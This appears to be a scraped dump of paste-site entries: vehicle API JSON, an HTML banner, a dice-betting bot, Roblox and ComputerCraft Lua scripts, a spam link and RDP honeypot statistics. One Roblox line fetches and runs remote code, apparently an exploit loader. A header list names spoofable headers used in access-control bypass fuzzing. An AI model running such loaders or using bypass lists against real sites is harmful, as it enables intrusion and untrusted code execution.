                        ""moas_id"": null,
                        ""is_recommended"": true,
                        ""is_popular"": false,
                        ""is_trending"": false,
                        ""created_at"": 1701253610,
                        ""updated_at"": 1706086899,
                        ""deleted_at"": 0,
                        ""all_specs"": null,
                        ""vehicle_series"": null,
                        ""vehicle_brand"": null,
                        ""vehicle_category"": null,
                        ""vehicle_group"": null,
                        ""vehicle_fuel"": null,
                        ""vehicle_transmission"": null,
                        ""vehicle_specs"": null,
                        ""vehicle_otr"": null,
                        ""vehicle_type"": null
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""cd913c92-0197-426e-9953-6194acc872ec"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-info"",
                    ""field"": ""year"",
                    ""value"": 2022,
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""ef1bf71a-59ff-43f7-8a88-588c88ce5ab6"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-info"",
                    ""field"": ""city"",
                    ""value"": {
                        ""city_id"": ""c2ca90f6-133b-4818-8957-e01a9e478f63"",
                        ""created_at"": 1702442413,
                        ""deleted_at"": 0,
                        ""name"": ""Tangerang Selatan"",
                        ""position"": 10,
                        ""province"": {
                            ""created_at"": 1702435790,
                            ""deleted_at"": 0,
                            ""name"": ""Banten"",
                            ""province_id"": ""7b8984ec-b722-4089-afdb-f77f796e1b5a"",
                            ""updated_at"": 1702435790
                        },
                        ""province_id"": ""7b8984ec-b722-4089-afdb-f77f796e1b5a"",
                        ""updated_at"": 1702442413
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""f2ef0a18-37fb-4f52-870a-bced7933806a"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-info"",
                    ""field"": ""vehicle_brand"",
                    ""value"": {
                        ""code"": ""00T"",
                        ""created_at"": 1691577703,
                        ""deleted_at"": 0,
                        ""media"": null,
                        ""media_id"": ""3ffbf111-3a88-4012-a025-e90fac1e7f94"",
                        ""name"": ""HONDA"",
                        ""updated_at"": 1691577703,
                        ""vehicle_brand_id"": ""31edaaaa-631c-4254-82a5-f3423fee3050"",
                        ""vehicle_group"": null,
                        ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4""
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""4aaa15f7-777f-4188-af76-e1ee558a311c"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-info"",
                    ""field"": ""vehicle_series"",
                    ""value"": {
                        ""code"": """",
                        ""created_at"": 1701242399,
                        ""deleted_at"": 0,
                        ""domicile_name"": """",
                        ""max_price"": 0,
                        ""min_price"": 0,
                        ""moas_id"": 63,
                        ""name"": ""CIVIC TYPE R"",
                        ""updated_at"": 1701242399,
                        ""vehicle_brand"": null,
                        ""vehicle_brand_id"": ""31edaaaa-631c-4254-82a5-f3423fee3050"",
                        ""vehicle_category"": null,
                        ""vehicle_category_id"": ""e35060f5-538e-4a5e-a8dc-44a4a875d942"",
                        ""vehicle_group"": null,
                        ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                        ""vehicle_otrs"": null,
                        ""vehicle_series_id"": ""8cf758e4-7ff7-4d4a-8ae7-195de1dfe34e"",
                        ""vehicle_series_image"": null,
                        ""vehicle_series_thumbnail"": null,
                        ""wishlisted"": false
                    },
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""2cf1c09a-56e8-41c0-9cd2-5395529ec981"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""vehicle-info"",
                    ""field"": ""registration_validity_period"",
                    ""value"": ""04-2025"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                }
            ]
        }
    },
    ""message"": ""Success"",
    ""errors"": null
}"
Vi4k4ZSi,Nobody's Home,allewhite,HTML,Sunday 7th of April 2024 09:44:16 PM CDT,"<link href=""https://fonts.googleapis.com/css?family=Henny+Penny|Itim&display=swap"" rel=""stylesheet""><link rel=""stylesheet"" type=""text/cs0s"" href=""https://raw.githack.com/allewhite/rpg/main/may.css""><center><div style=""font:28px Henny Penny;margin-bottom:-12px;color:#ab4d63;text-shadow:2px 2px 1px #000;""text-align:center;"">[color=#63834e]NO[/color]BODY'S HOME</div><table><td><div class=""il"" style=""border:3px solid #ab4d63;box-shadow:-2px 2px 2px #63834e;"">[img]https://imgur.com/6uIerpn.gif[/img]</div></td><td><div class=""il"" style=""border:3px solid #ab4d63;box-shadow:2px 2px 2px #63834e;"">[img]https://imgur.com/sKtjxqP.gif[/img]</div></div></table><div class=""se"" style=""font:10.5px Itim;color:#4f4f4f;"">[color=#ab4d63][b]That's[/b][/color] where she lies ‚òÖ B[color=#ab4d63][u]roken[/u][/color] inside</div><div style=""font:7px Calibri;margin-top:-1px;"">[url=https://nightmare-resources.tumblr.com/][color=#494949]badger[/color][/url]</div></center>"
nFWaqi6w,finally a program works snowybot,coinwalk,JavaScript,Sunday 7th of April 2024 09:36:50 PM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var monkey = Number((olsenest/1000).toFixed(8)); 
var bolux = monkey;
var tens = (monkey*10);
var twenty = (monkey*10);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var awesome = ((Math.floor(olsenest/tens))*tens);
var olsen = 0;
var upper = 6.9;
var downer = 2.9;
var belance = olsenest;
var vore = olsenest;
var slumber = olsenest;
var pigzie = olsenest;
var fart = 1;
var ruth = false;
 
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
 
 
async function go(){
await sleep(1);
vore = document.getElementById('pct_balance').value;
if (vore>slumber){
belance = belance+bolux;
slumber = parseFloat(vore);
}
if (vore<slumber){
belance = belance-bolux;
slumber = parseFloat(vore);
}
var dog = Number((belance-olsenest).toFixed(8));
var hove = Number((vore-olsenest).toFixed(8));
var diggy = (dog-hove);
console.clear();
console.log(""profit"");
console.log(dog);
console.log(""profit ment to be"");
console.log(hove);
console.log(""difference"")
console.log(diggy);
if (diggy>0){
alert(""someone bet on your balance"");
return;
}
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance>olsen)){
    bolux = bolux*2
    ruth = false;
    olsen = parseFloat(belance);
    olsenia = parseFloat(belance);
}
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance<olsen)&&(ruth)){
    bolux = bolux*2
    fart = 0;
    ruth = false;
    olsen = parseFloat(belance);
}
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance<olsen)&&(!ruth)){
    ruth = true;
    olsen = parseFloat(belance);
}
if ((belance>=(awesome+(tens*fart)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    ruth = false;
    fart = 1;
    awesome = ((Math.floor(belance/tens))*tens);
}
if (((belance-(bolux*200))<=0)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    ruth = false;
    fart = 0;
}
if (belance>=(pigzie*24)){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
await go();
}
go();"
V4bR49m3,WokeScripts,dayrox12,Lua,Sunday 7th of April 2024 09:34:15 PM CDT,loadstring(game:HttpGet('https://rentry.co/WokeScripts/raw'))()
kXrjgdpN,http-header.txt,c4sper0,GetText,Sunday 7th of April 2024 08:08:39 PM CDT,"Accept
Accept-Charset
Accept-Datetime
Accept-Encoding
Accept-Language
Content-Type
Connection
Cache-Control
X-Forward-For
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-IP
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-Server
X-Forwarder-For
X-Host
X-Http-Destinationurl
X-Http-Host-Override
X-Http-Method-Override
X-Original-Remote-Addr
X-Original-Url
X-Originating-IP
User-Agent
Cookie"
svrWKbdP,Stargate Lockdown,Alexr360,Lua,Sunday 7th of April 2024 07:59:45 PM CDT,"print(""Lockdown Enabled"")
-- Listen for events from the ""crystal_interface"" peripheral
local crystalInterface = peripheral.find(""crystal_interface"")
if not crystalInterface then
    print(""Crystal interface peripheral not found!"")
    return
end

-- Main event loop
while true do
    crystalInterface.disconnectStargate()
end"
eqXJdU0D,Roblox Billboard Chat,scriptingtales,Lua,Sunday 7th of April 2024 07:57:04 PM CDT,"local textSound = Instance.new(""Sound"", owner.Character.Head)
textSound.SoundId = ""rbxassetid://5416525817""
textSound.Volume = 2
local billb = Instance.new(""BillboardGui"")
billb.Adornee = owner.Character.Head
billb.ExtentsOffsetWorldSpace = Vector3.new(0, 5, 0)
billb.LightInfluence = 0
billb.Size = UDim2.fromScale(20, 1)
billb.Parent = script
local texb = Instance.new(""TextLabel"", billb)
texb.BackgroundTransparency = 1
texb.TextScaled = true
texb.Font = Enum.Font.SciFi
texb.TextStrokeTransparency = 0
texb.TextColor3 = Color3.fromRGB(255, 255, 255)
texb.Size = UDim2.fromScale(1,1)
texb.Text = """"

local task_delay = nil

owner.Chatted:Connect(function(txt)
	for i = 1, #txt, 1 do
		texb.Text = string.sub(txt, 1, i)
		textSound:Play()
		task.wait(0.01)
	end

	if task_delay then
		task.cancel(task_delay)
	end

	task_delay = task.delay(15, function()
		texb.Text = """"
	end)

end)"
FVVeGgn8,Untitled,sissou123,C,Sunday 7th of April 2024 07:53:14 PM CDT,"C Programming Bootcamp - The Complete C Language Course
C Programming 2024: Master the Fundamentals of C Programming Language. Join the Comprehensive C Bootcamp Masterclass! 
What you'll learn
Fundamentals of Programming
Summarised & Concise Material [Saving TONS of Time!]
OVER 100 Practical Exercises! 
for more :https://cuty.io/hJda75Y13zR
"
Sg6igrxZ,Entity Lock,Alexr360,Lua,Sunday 7th of April 2024 07:27:00 PM CDT,"-- Listen for events from the ""crystal_interface"" peripheral
local crystalInterface = peripheral.find(""crystal_interface"")
if not crystalInterface then
    print(""Crystal interface peripheral not found!"")
    return
end

-- Function to handle incoming events
local function handleEvent(eventName, travelerType, displayName, uuid)
    if eventName == ""stargate_reconstructing_entity"" then
        print(""Traveler Type:"", travelerType)
        print(""Entity Display Name:"", displayName)
        print(""UUID:"", uuid)
    end
end

-- Main event loop
while true do
    local event = {os.pullEvent()}
    handleEvent(unpack(event))
end"
SLwRY4A4,2024-04-07_stats.json,rdp_snitch,JSON,Sunday 7th of April 2024 07:18:14 PM CDT,"{
  ""ip"": {
    ""198.135.49.131"": 69,
    ""194.165.16.76"": 6,
    ""35.238.194.27"": 6,
    ""185.11.61.106"": 6,
    ""198.235.24.80"": 9,
    ""194.165.16.37"": 6,
    ""45.227.254.9"": 3,
    ""116.140.196.215"": 6,
    ""223.130.11.128"": 3,
    ""185.170.144.3"": 6,
    ""81.21.8.57"": 9,
    ""185.170.144.113"": 9,
    ""205.210.31.94"": 9,
    ""206.168.34.49"": 3,
    ""196.190.117.7"": 6,
    ""195.69.246.15"": 3,
    ""103.20.97.235"": 6,
    ""87.251.75.145"": 6,
    ""103.245.237.31"": 12,
    ""198.235.24.81"": 9,
    ""45.227.254.55"": 6,
    ""96.8.115.25"": 3,
    ""212.70.149.146"": 3,
    ""194.165.16.10"": 6,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""80.94.95.114"": 9,
    ""45.87.212.184"": 3,
    ""198.235.24.235"": 9
  },
  ""asn"": {
    ""AS396073"": 69,
    ""AS48721"": 18,
    ""AS396982"": 42,
    ""AS57523"": 6,
    ""AS267784"": 9,
    ""AS4837"": 6,
    ""AS140810"": 3,
    ""AS197414"": 15,
    ""AS44486"": 9,
    ""AS398324"": 3,
    ""AS24757"": 6,
    ""AS3255"": 3,
    ""AS150880"": 6,
    ""AS208091"": 6,
    ""AS150867"": 12,
    ""AS36352"": 3,
    ""AS204428"": 12,
    ""AS208046"": 18,
    ""AS9009"": 3
  },
  ""isp"": {
    ""Majestic Hosting Solutions, LLC"": 69,
    ""Flyservers S.A."": 27,
    ""Google LLC"": 42,
    ""Chang Way Technologies Co. Limited"": 6,
    ""China Unicom CHINA169 Network"": 6,
    ""LITESPEED-COM"": 3,
    ""Xhost Internet Solutions LP"": 21,
    ""Oliver Horscht is trading as \""SYNLINQ\"""": 9,
    ""Censys, Inc."": 3,
    ""Ethiotelecom"": 6,
    ""State Enterprise Scientific and Telecommunication Centre \""Ukrainian Academic an"": 3,
    ""Fast Byte Fast Data Company Limited"": 6,
    ""LP TECHNOLOGY ELECTRONIC COMMERCE COMPANY LIMITED"": 12,
    ""HostPapa"": 3,
    ""SS-Net"": 12,
    ""ColocationX Ltd."": 18,
    ""M247 Europe SRL"": 3
  },
  ""org"": {
    ""Majestic Hosting Solutions, LLC"": 69,
    ""Flyservers S.A"": 18,
    ""Google Cloud (us-central1)"": 6,
    ""Starcrecium Limited"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""UAB Host Baltic"": 9,
    ""China United Network Communications Corporation Limited"": 6,
    ""Litespeed Technology Company Limited"": 3,
    ""Xhostis"": 15,
    ""Unknown"": 15,
    ""Censys Inc"": 3,
    ""Nataliya Vasylivna Protsykevych P.E"": 3,
    ""FASTBYTE"": 6,
    ""Xhost Internet Solutions"": 6,
    ""LP Technology Electronic Commerce Company Limited"": 12,
    ""Michael Charlery"": 3,
    ""4Media Ltd"": 3,
    ""Makut Investments"": 9,
    ""ColocationX Ltd"": 9,
    ""Unmanaged LTD"": 9,
    ""M247 LTD"": 3
  },
  ""regionName"": {
    ""Texas"": 72,
    ""Kaunas"": 18,
    ""Iowa"": 6,
    ""Chechnya"": 6,
    ""California"": 36,
    ""Vilnius"": 9,
    ""Beijing"": 6,
    ""Ho Chi Minh"": 21,
    ""North Holland"": 30,
    ""Riyadh Region"": 9,
    ""Illinois"": 3,
    ""Addis Ababa"": 6,
    ""Lviv"": 3,
    ""Sliven"": 3,
    ""Virginia"": 9,
    ""Budapest"": 9,
    ""Hesse"": 3
  },
  ""country"": {
    ""United States"": 126,
    ""Lithuania"": 27,
    ""Russia"": 6,
    ""China"": 6,
    ""Vietnam"": 21,
    ""The Netherlands"": 30,
    ""Saudi Arabia"": 9,
    ""Ethiopia"": 6,
    ""Ukraine"": 3,
    ""Bulgaria"": 3,
    ""Hungary"": 9,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 108,
    ""Test"": 36,
    ""Administr"": 21,
    ""qSGnHqkos"": 3,
    ""kYxFWx"": 3,
    ""zHuqar"": 3,
    ""(empty)"": 9,
    ""Domain"": 36,
    ""juDRHQxSm"": 3,
    ""CBVptt"": 3,
    ""qpzQkf"": 3,
    ""oJYxsrVtF"": 3,
    ""nWsKDJ"": 3,
    ""CHndpf"": 3,
    ""CTzKsrg"": 3,
    ""sLmyOGioY"": 3,
    ""bDLbaT"": 3,
    ""YLvspy"": 3
  },
  ""keyboard"": {
    ""Unknown"": 249
  },
  ""client_build"": {
    ""Unknown"": 249
  },
  ""client_name"": {
    ""Unknown"": 249
  },
  ""ip_type"": {
    ""hosting"": 114,
    ""Unknown"": 108,
    ""proxy"": 15,
    ""mobile"": 9,
    ""hosting & proxy"": 3
  }
}"
XHDh22pG,2024-04-07_stats.json,rdp_snitch,JSON,Sunday 7th of April 2024 07:16:15 PM CDT,"{
  ""ip"": {
    ""198.135.49.131"": 46,
    ""194.165.16.76"": 4,
    ""35.238.194.27"": 4,
    ""185.11.61.106"": 4,
    ""198.235.24.80"": 6,
    ""194.165.16.37"": 4,
    ""45.227.254.9"": 2,
    ""116.140.196.215"": 4,
    ""223.130.11.128"": 2,
    ""185.170.144.3"": 4,
    ""81.21.8.57"": 6,
    ""185.170.144.113"": 6,
    ""205.210.31.94"": 6,
    ""206.168.34.49"": 2,
    ""196.190.117.7"": 4,
    ""195.69.246.15"": 2,
    ""103.20.97.235"": 4,
    ""87.251.75.145"": 4,
    ""103.245.237.31"": 8,
    ""198.235.24.81"": 6,
    ""45.227.254.55"": 4,
    ""96.8.115.25"": 2,
    ""212.70.149.146"": 2,
    ""194.165.16.10"": 4,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""80.94.95.114"": 6,
    ""45.87.212.184"": 2,
    ""198.235.24.235"": 6
  },
  ""asn"": {
    ""AS396073"": 46,
    ""AS48721"": 12,
    ""AS396982"": 28,
    ""AS57523"": 4,
    ""AS267784"": 6,
    ""AS4837"": 4,
    ""AS140810"": 2,
    ""AS197414"": 10,
    ""AS44486"": 6,
    ""AS398324"": 2,
    ""AS24757"": 4,
    ""AS3255"": 2,
    ""AS150880"": 4,
    ""AS208091"": 4,
    ""AS150867"": 8,
    ""AS36352"": 2,
    ""AS204428"": 8,
    ""AS208046"": 12,
    ""AS9009"": 2
  },
  ""isp"": {
    ""Majestic Hosting Solutions, LLC"": 46,
    ""Flyservers S.A."": 18,
    ""Google LLC"": 28,
    ""Chang Way Technologies Co. Limited"": 4,
    ""China Unicom CHINA169 Network"": 4,
    ""LITESPEED-COM"": 2,
    ""Xhost Internet Solutions LP"": 14,
    ""Oliver Horscht is trading as \""SYNLINQ\"""": 6,
    ""Censys, Inc."": 2,
    ""Ethiotelecom"": 4,
    ""State Enterprise Scientific and Telecommunication Centre \""Ukrainian Academic an"": 2,
    ""Fast Byte Fast Data Company Limited"": 4,
    ""LP TECHNOLOGY ELECTRONIC COMMERCE COMPANY LIMITED"": 8,
    ""HostPapa"": 2,
    ""SS-Net"": 8,
    ""ColocationX Ltd."": 12,
    ""M247 Europe SRL"": 2
  },
  ""org"": {
    ""Majestic Hosting Solutions, LLC"": 46,
    ""Flyservers S.A"": 12,
    ""Google Cloud (us-central1)"": 4,
    ""Starcrecium Limited"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""UAB Host Baltic"": 6,
    ""China United Network Communications Corporation Limited"": 4,
    ""Litespeed Technology Company Limited"": 2,
    ""Xhostis"": 10,
    ""Unknown"": 10,
    ""Censys Inc"": 2,
    ""Nataliya Vasylivna Protsykevych P.E"": 2,
    ""FASTBYTE"": 4,
    ""Xhost Internet Solutions"": 4,
    ""LP Technology Electronic Commerce Company Limited"": 8,
    ""Michael Charlery"": 2,
    ""4Media Ltd"": 2,
    ""Makut Investments"": 6,
    ""ColocationX Ltd"": 6,
    ""Unmanaged LTD"": 6,
    ""M247 LTD"": 2
  },
  ""regionName"": {
    ""Texas"": 48,
    ""Kaunas"": 12,
    ""Iowa"": 4,
    ""Chechnya"": 4,
    ""California"": 24,
    ""Vilnius"": 6,
    ""Beijing"": 4,
    ""Ho Chi Minh"": 14,
    ""North Holland"": 20,
    ""Riyadh Region"": 6,
    ""Illinois"": 2,
    ""Addis Ababa"": 4,
    ""Lviv"": 2,
    ""Sliven"": 2,
    ""Virginia"": 6,
    ""Budapest"": 6,
    ""Hesse"": 2
  },
  ""country"": {
    ""United States"": 84,
    ""Lithuania"": 18,
    ""Russia"": 4,
    ""China"": 4,
    ""Vietnam"": 14,
    ""The Netherlands"": 20,
    ""Saudi Arabia"": 6,
    ""Ethiopia"": 4,
    ""Ukraine"": 2,
    ""Bulgaria"": 2,
    ""Hungary"": 6,
    ""Germany"": 2
  },
  ""account"": {
    ""hello"": 72,
    ""Test"": 24,
    ""Administr"": 14,
    ""qSGnHqkos"": 2,
    ""kYxFWx"": 2,
    ""zHuqar"": 2,
    ""(empty)"": 6,
    ""Domain"": 24,
    ""juDRHQxSm"": 2,
    ""CBVptt"": 2,
    ""qpzQkf"": 2,
    ""oJYxsrVtF"": 2,
    ""nWsKDJ"": 2,
    ""CHndpf"": 2,
    ""CTzKsrg"": 2,
    ""sLmyOGioY"": 2,
    ""bDLbaT"": 2,
    ""YLvspy"": 2
  },
  ""keyboard"": {
    ""Unknown"": 166
  },
  ""client_build"": {
    ""Unknown"": 166
  },
  ""client_name"": {
    ""Unknown"": 166
  },
  ""ip_type"": {
    ""hosting"": 76,
    ""Unknown"": 72,
    ""proxy"": 10,
    ""mobile"": 6,
    ""hosting & proxy"": 2
  }
}"
